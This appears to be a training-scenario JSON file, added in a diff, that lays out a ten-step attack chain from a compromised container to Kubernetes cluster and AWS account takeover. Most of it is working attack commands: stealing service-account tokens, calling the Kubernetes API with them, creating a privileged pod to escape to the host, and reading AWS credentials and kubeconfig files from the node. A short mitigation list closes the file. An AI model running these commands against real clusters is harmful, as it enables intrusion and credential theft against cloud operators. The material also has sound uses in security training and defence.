@@ -1,0 +1,117 @@
+{
+  "title": "Container Escape to Cloud Control Plane",
+  "description": "Complete attack chain from container compromise to Kubernetes cluster and cloud account takeover",
+  "difficulty": "expert",
+  "estimated_time": "100 minutes",
+  "tools_used": [
+    "kubectl",
+    "docker",
+    "aws-cli",
+    "kubeletctl"
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "title": "Container Compromise",
+      "command": "docker ps && docker exec -it container_id /bin/bash",
+      "explanation": "Initial access to running container",
+      "expected_output": "root@container:/app# - shell access",
+      "success_criteria": "Container shell obtained"
+    },
+    {
+      "step": 2,
+      "title": "Enumerate Container Capabilities",
+      "command": "capsh --print",
+      "explanation": "Check container capabilities for escape vectors",
+      "expected_output": "CAP_SYS_ADMIN, CAP_NET_ADMIN present",
+      "success_criteria": "Privileged capabilities found"
+    },
+    {
+      "step": 3,
+      "title": "Check for Kubernetes Service Account",
+      "command": "ls /var/run/secrets/kubernetes.io/serviceaccount/",
+      "explanation": "Look for mounted Kubernetes service account token",
+      "expected_output": "ca.crt, namespace, token files present",
+      "success_criteria": "Service account token found"
+    },
+    {
+      "step": 4,
+      "title": "Extract Service Account Token",
+      "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
+      "explanation": "Retrieve Kubernetes authentication token",
+      "expected_output": "eyJhbGciOiJSUzI1NiIs... token, namespace: default",
+      "success_criteria": "Token extracted"
+    },
+    {
+      "step": 5,
+      "title": "Kubernetes API Access",
+      "command": "curl -k -H \"Authorization: Bearer TOKEN\" https://kubernetes.default.svc/api/v1/pods",
+      "explanation": "Access Kubernetes API using stolen token",
+      "expected_output": "Pod list returned, API accessible",
+      "success_criteria": "API access confirmed"
+    },
+    {
+      "step": 6,
+      "title": "Enumerate Kubernetes Permissions",
+      "command": "kubectl auth can-i --list --token=TOKEN",
+      "explanation": "Check permissions of compromised service account",
+      "expected_output": "Can create pods, secrets, get pods in all namespaces",
+      "success_criteria": "Elevated permissions discovered"
+    },
+    {
+      "step": 7,
+      "title": "Create Privileged Pod",
+      "command": "kubectl apply -f privileged-pod.yaml --token=TOKEN",
+      "explanation": "Deploy privileged pod with host filesystem access",
+      "expected_output": "pod/escape-pod created",
+      "success_criteria": "Privileged pod running"
+    },
+    {
+      "step": 8,
+      "title": "Container Escape to Host",
+      "command": "kubectl exec -it escape-pod -- chroot /host /bin/bash",
+      "explanation": "Escape container to underlying Kubernetes node",
+      "expected_output": "root@k8s-node:/# - host shell access",
+      "success_criteria": "Host access achieved"
+    },
+    {
+      "step": 9,
+      "title": "Extract Cloud Credentials from Node",
+      "command": "cat /home/ubuntu/.aws/credentials && cat /var/lib/kubelet/kubeconfig",
+      "explanation": "Search for cloud credentials on Kubernetes node",
+      "expected_output": "AWS credentials, kubeconfig with cluster-admin",
+      "success_criteria": "Cloud credentials found"
+    },
+    {
+      "step": 10,
+      "title": "AWS Account Takeover",
+      "command": "export AWS_ACCESS_KEY_ID=AKIA... && aws sts get-caller-identity && aws iam list-users",
+      "explanation": "Use extracted credentials for cloud access",
+      "expected_output": "Account: 123456789012, 15 IAM users",
+      "success_criteria": "Cloud account access obtained"
+    }
+  ],
+  "learning_objectives": [
+    "Container escape techniques",
+    "Kubernetes service account exploitation",
+    "Privileged pod deployment",
+    "Host filesystem access",
+    "Cloud credential harvesting",
+    "K8s to cloud pivot"
+  ],
+  "mitigation": [
+    "Use non-root containers",
+    "Disable privileged containers",
+    "Implement Pod Security Standards",
+    "Use IRSA/Workload Identity",
+    "Network policies",
+    "Audit logging"
+  ],
+  "tags": [
+    "kubernetes",
+    "container_escape",
+    "aws",
+    "privilege_escalation",
+    "cloud_takeover"
+  ]
+}
